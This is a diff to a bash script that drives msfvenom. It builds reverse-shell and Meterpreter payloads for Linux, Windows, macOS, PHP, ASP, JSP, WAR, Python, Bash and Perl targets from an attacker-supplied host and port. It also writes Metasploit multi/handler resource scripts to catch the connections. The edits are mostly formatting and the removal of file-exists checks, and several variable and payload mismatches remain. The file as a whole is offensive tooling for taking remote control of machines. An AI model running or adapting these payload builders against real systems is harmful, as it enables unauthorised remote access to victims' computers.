@@ -10,14 +10,15 @@ linuxpayload()
 {
 	echo "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf"
 	echo -e "$YELLOW"
-	echo -e "\n"
+	echo -e "\n #############################################"
 	read -p "enter lhost:" llh
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "lport" llp
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "output" llo
-	echo -e "\n"
-	ms echo -e "$GREEN"fvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$llh LPORT=$llp -f elf > $llo.elf
+	echo -e " \n #############################################"
+	echo -e "$GREEN"
+	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$llh LPORT=$llp -f elf > $llo.elf
 	##rc creation for linux payload
 	linuxrc
 	start
@@ -27,13 +28,13 @@ windowspayload()
 {
 	echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe"
 	echo -e "$YELLOW"
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "enter lhost:" wlh
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "enter lport" wlp
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "output" wlo
-	echo -e "\n"
+	echo -e " \n #############################################"
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$wlh LPORT=$wlp -f exe > $wlo.exe
 	winrc
 	start
@@ -43,11 +44,11 @@ macpayload()
 {
 	echo "msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho"
 	echo -e "$YELLOW"
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "enter lhost:" mlh
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "enter lport" mlp
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "output" mlo
 	msfvenom -p osx/x86/shell_reverse_tcp LHOST=$mlh LPORT=$mlp -f macho > $mlo.macho
 	macrc
@@ -57,29 +58,29 @@ phppayload()
 {
 	echo "msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php && cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php"
 	echo -e "$YELLOW"
-	echo -e "\n"
-	read -p "enter lhost:" plh
-	echo -e "\n"
+	echo -e " \n #############################################"
+	read  -p "enter lhost:" plh
+	echo -e " \n #############################################"
 	read -p "lport" plp
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p  "output " plo 
-	echo -e "\n"
-	msfvenom -p php/meterpreter_reverse_tcp LHOST=$plh LPORT=$plp -f raw > $plo.php &&cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php 
+	echo -e " \n #############################################"
+	msfvenom -p php/meterpreter_reverse_tcp LHOST=$plh LPORT=$plp -f raw > $plo.php  
 	phprc
-	start
+	start 
 }
 
 asppayload()
 {
 	echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp"
 	echo -e "$YELLOW"
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "enter lhost:" alh
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "lport"  alp
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "output" alo
-	echo -e "\n"
+	echo -e " \n #############################################"
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$alh LPORT=$alp -f asp > $alo.asp
 	asprc
 	start
@@ -89,11 +90,11 @@ jsppayload()
 {
 	echo "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp"
 	echo -e "$YELLOW"
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "enter lhost:" jlh
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "lport" jlp
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "output"jlo
 	msfvenom -p java/jsp_shell_reverse_tcp LHOST=$jlh LPORT=$jlp -f raw > $jls.jsp
 	jsprc
@@ -104,13 +105,13 @@ warpayload()
 {
 	echo "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war"
 	echo -e "$YELLOW"
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "enter lhost:" wwlh
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "lport" wwlp
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "output" wwlo
-	echo -e "\n"
+	echo -e " \n #############################################"
 	msfvenom -p java/jsp_shell_reverse_tcp LHOST=$wwlh LPORT=$wwlp -f war > $wwlo.war
 	warrc
 	start
@@ -119,14 +120,14 @@ pythonpayload()
 {
 	echo "msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py"
 	echo -e "$YELLOW"
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "enter lhost:" plh	
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "lport" plp
-	echo -e "\n"
-	read -p "output" pllo
-	echo -e "\n"
-	msfvenom -p cmd/unix/reverse_python LHOST=$plh LPORT=$plp -f raw > $pllo.py
+	echo -e " \n #############################################"
+	read -p "output" plo
+	echo -e " \n #############################################"
+	msfvenom -p cmd/unix/reverse_python LHOST=$plh LPORT=$plp -f raw > $plo.py
 	pyrc
 	start
 }
@@ -134,13 +135,13 @@ bashpayload()
 {
 	echo "msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh"
 	echo -e "$YELLOW"
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "enter lhost:" ulh
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "lport" ulp
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "output" ulo
-	echo -e "\n"
+	echo -e " \n #############################################"
 	msfvenom -p cmd/unix/reverse_bash LHOST=$ulh LPORT=$ulp -f raw > $ulo.sh
 	barc
 	start
@@ -149,24 +150,23 @@ perlpayload()
 {
 	echo "msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl"
 	echo -e "$YELLOW"
-	echo -e "\n"
+	echo -e " \n #############################################"
 	read -p "enter lhost:" prh
-	echo -e "\n"
-	read -p "lport" prp
-	echo -e "\n"
+	echo -e " \n #############################################"
+	read -p "lport" prp 
+	echo -e " \n #############################################"
 	read -p "output" pro
-	echo -e "\n"
+	echo -e " \n #############################################"
 	msfvenom -p cmd/unix/reverse_perl LHOST=$prh LPORT=$prp -f raw > $pro.pl
 	perc
 	start
 }
 ## resource script starts
 linuxrc()
-{   echo -e "$RED"
-	read -p "enter rc name" lrc
-	echo -e "\n your metsploit rc wil be saved in  $PWD"
-	lsh=$(ls | grep -w "$lrc.rc")
-	if [ "$lsh" ]; then
+{   
+		echo -e "$RED"
+		read -p "enter rc name" lrc
+		echo -e "\n your metsploit rc wil be saved in  $PWD"
 		touch $lrc.rc
 		echo "workspace $lrc">${lrc}.rc
 		echo "use exploit/multi/handler">>${lrc}.rc
@@ -174,14 +174,10 @@ linuxrc()
 		echo "set lhost $llh" >>${lrc}.rc
 		echo "set lport $llp" >>${lrc}.rc
 		echo "exploit -j -z" >> ${lrc}.rc
-		else
-			echo "file already exists try again with other name"
-	fi
+		echo 
 }
 windowsrc()
-{
-	winsh=$(ls | grep -w "$winrc.rc")
-	if [ "$winsh" ]; then
+{  
 		echo -e "$RED"
 		read -p "enter rc name" winrc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
@@ -192,14 +188,10 @@ windowsrc()
 		echo "set lhost $wlh" >>${winrc}.rc
 		echo "set lport $wlp" >>${winrc}.rc
 		echo "exploit -j -z" >> ${winrc}.rc
-		else
-			echo "file already exists try again with other name"
-	fi
+		
 }
 macrc()
-{
-	macsh=$(ls | grep -w "$macrc.rc")
-	if [ "$macsh" ]; then
+{ 
 		echo -e "$RED"
 		read -p "enter rc name" macrc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
@@ -210,14 +202,10 @@ macrc()
 		echo "set lhost $mlh" >>${macrc}.rc
 		echo "set lport $mlp" >>${macrc}.rc
 		echo "exploit -j -z" >> ${macrc}.rc
-		else
-			echo "file already exists try again with other name"
-	fi
+		
 }
 phprc()
-{
-	phpsh=$(ls | grep -w "$phprc.rc")
-	if [ "$phpsh" ]; then
+{   
 		echo -e "$RED"
 		read -p "enter rc name" phprc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
@@ -228,14 +216,10 @@ phprc()
 		echo "set lhost $plh" >>${phprc}.rc
 		echo "set lport $plp" >>${phprc}.rc
 		echo "exploit -j -z" >> ${phprc}.rc
-		else
-			echo "file already exists try again with other name"
-	fi
+		
 }
 asprc()
-{
-	aspsh=$(ls | grep -w "$asprc.rc")
-	if [ "$phpsh" ]; then
+{  
 		echo -e "$RED"
 		read -p "enter rc name" asprc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
@@ -246,14 +230,10 @@ asprc()
 		echo "set lhost $alh" >>${asprc}.rc
 		echo "set lport $alp" >>${asprc}.rc
 		echo "exploit -j -z" >> ${asprc}.rc
-		else
-			echo "file already exists try again with other name"
-	fi
+		
 }
 jsprc()
-{
-	jspsh=$(ls | grep -w "$jsprc.rc")
-	if [ "$phpsh" ]; then
+{   
 		echo -e "$RED"
 		read -p "enter rc name" jsprc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
@@ -264,14 +244,9 @@ jsprc()
 		echo "set lhost $jlh" >>${jsprc}.rc
 		echo "set lport $jlp" >>${phprc}.rc
 		echo "exploit -j -z" >> ${phprc}.rc
-		else
-			echo "file already exists try again with other name"
-	fi
-}
+}	
 warrc()
-{
-	warsh=$(ls | grep -w "$warrc.rc")
-	if [ "$warsh" ]; then
+{   
 		echo -e "$RED"
 		read -p "enter rc name" warrc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
@@ -282,14 +257,9 @@ warrc()
 		echo "set lhost $wwlh" >>${warrc}.rc
 		echo "set lport $wwlp" >>${warrc}.rc
 		echo "exploit -j -z" >> ${warrc}.rc
-		else
-			echo "file already exists try again with other name"
-	fi
 }
 pyrc()
-{
-	pysh=$(ls | grep -w "$pyrc.rc")
-	if [ "$pysh" ]; then
+{ 
 		echo -e "$RED"
 		read -p "enter rc name" pyrc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
@@ -300,14 +270,10 @@ pyrc()
 		echo "set lhost $plh" >>${pyrc}.rc
 		echo "set lport $plp" >>${pyrc}.rc
 		echo "exploit -j -z" >> ${pyrc}.rc
-		else
-			echo "file already exists try again with other name"
-	fi
 }
 barc()
-{
-	barsh=$(start)
-	if [ "$barsh" ]; then
+{       
+	
 		echo -e "$RED"
 		read -p "enter rc name" barc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
@@ -318,14 +284,9 @@ barc()
 		echo "set lhost $ulh" >>${barc}.rc
 		echo "set lport $ulp" >>${barc}.rc
 		echo "exploit -j -z" >> ${barc}.rc
-	    else
-			echo "file already exists try again with other name"
-	fi
 }
 perc()
-{
-	persh=$(ls | grep -w "$perc.rc")
-	if [ "$persh" ]; then
+{   
 		echo -e "$RED"
 		read -p "enter rc name" perc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
@@ -334,11 +295,8 @@ perc()
 		echo "use exploit/multi/handler">>${perc}.rc
 		echo "set  payload cmd/unix/reverse_bash">>${perc}.rc
 		echo "set lhost $prh" >>${perc}.rc
-		echo "set lport $pro" >> ${perc}.rc
+		echo "set lport $prp" >> ${perc}.rc
 		echo "exploit -j -z" >> ${perc}.rc
-		else
-			echo "file already exists try again with other name"
-	fi
 }
 start(){
 	 echo -e "$GREEN"
